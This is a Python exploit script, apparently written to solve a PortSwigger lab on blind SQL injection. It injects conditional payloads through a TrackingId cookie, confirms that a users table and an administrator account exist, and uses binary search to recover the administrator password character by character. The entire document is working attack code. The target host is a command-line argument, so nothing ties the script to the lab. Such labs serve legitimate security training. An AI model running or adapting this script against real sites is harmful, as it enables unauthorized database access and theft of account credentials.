# lab link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import urllib3
import sys
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  'http':'127.0.0.1:8080',
  'https':'127.0.0.1:8080'
}

client = None
tracking_cookie = None
host = None

def send_request(payload):
  # Set the cookie alongwith the payload
  client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')

  # make the request
  response = client.get(f'{host}')

  # retreive the Welcome message from the html response
  soup = BeautifulSoup(response.text, 'html.parser')
  message = soup.find('div', string='Welcome back!')
  
  # If the response contains Welcome message, our payload was successfull
  if ('Welcome back!' in str(message)):
    return True
  return False

def get_tracking_cookie():
  global tracking_cookie
  response = client.get(f'{host}')

  # Retreive the tracking cookie from the HTTP response
  tracking_cookie = response.cookies.get('TrackingId')
  if tracking_cookie:
    print('(+) TrackingId cookie found.')
  else:
    print('(-) TrackingId cookie not found.')
    sys.exit(-1)

def confirm_injection():
  # send different payloads to confirm the injection

  if not send_request("' ORDER BY 1-- -"):
    print("(-) ORDER BY payload failed!")
    sys.exit(-1)
  print("(+) ORDER BY payload injected successfully")
  
  if not send_request("' AND (SELECT 1 FROM users LIMIT 1)=1 -- -"):
    print("(-) users table not found!")
    sys.exit(-1)
  print("(+) users table found")

  if not send_request("' AND (SELECT 1 FROM users WHERE username='administrator')=1 -- -"):
    print("(-) Either username column or username:administrator not found!")
    sys.exit(-1)
  print("(+) username column and username:administrator found.")

def get_password_length():
  # Retreive the password length using binary search to reduce the number of requests made
  pass_length = [x for x in range(1,100)]
  lb = 0
  ub = len(pass_length)

  while lb <= ub:
    mid = (lb+ub)//2

    if send_request(f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')={mid}-- -"):
      return mid
    
    elif send_request(f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>{mid}-- -"):
      lb = mid+1

    else:
      ub = mid-1

  print('(-) Can not determine password length!')
  sys.exit(-1)

def enumerate_admin_password(password_length):
  password = ''

  # ASCII positions for "lowercase alphanumeric" characters
  ascii_positions = [x for x in range(48, 57+1)] + [x for x in range(97, 122+1)]

  # Total requests to be made
  total_combinations = password_length*len(ascii_positions)
  print(f'(+) Starting password enumeration.... \nTotal requests: {total_combinations}')

  sys.stdout.write('\r[+] Current Extraction Status: ')
  sys.stdout.flush()

  req_count = 0
  for i in range(1, password_length+1):
    lb = 0
    ub = len(ascii_positions)-1

    while lb <= ub:
      req_count += 1

      mid_index = (lb+ub)//2
      mid_value = chr(ascii_positions[mid_index])

      if send_request(f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username='administrator')='{mid_value}' -- -"):
        password += mid_value
        break

      elif send_request(f"' AND (SELECT SUBSTRING(password, {i}, 1) FROM users WHERE username='administrator')>'{mid_value}' -- -"):
        lb = mid_index+1

      else: 
        ub = mid_index-1

    sys.stdout.write('\r[+] Current Extraction Status: ' + password)
    sys.stdout.flush()

    if (len(password) == password_length):
      print(f'\nTotal requests made: {req_count}')
      return password

  print('Failed!')
  sys.exit(-1)

if __name__ == '__main__':
  try:
    host = sys.argv[1].strip().rstrip('/')

  except IndexError:
    print(f'(+) Usage: {sys.argv[0]} <HOST>')
    print(f'(+) Example: {sys.argv[0]} http://www.example.com')
    sys.exit(-1)

  with requests.Session() as client:
    client.verify = False
    client.proxies = proxies
    
    get_tracking_cookie()
    confirm_injection()

    password_length = get_password_length()
    print(f'(+) Password Length: {password_length} Characters')

    admin_password = enumerate_admin_password(password_length)
    print(f'(+) Found administrator password: {admin_password}')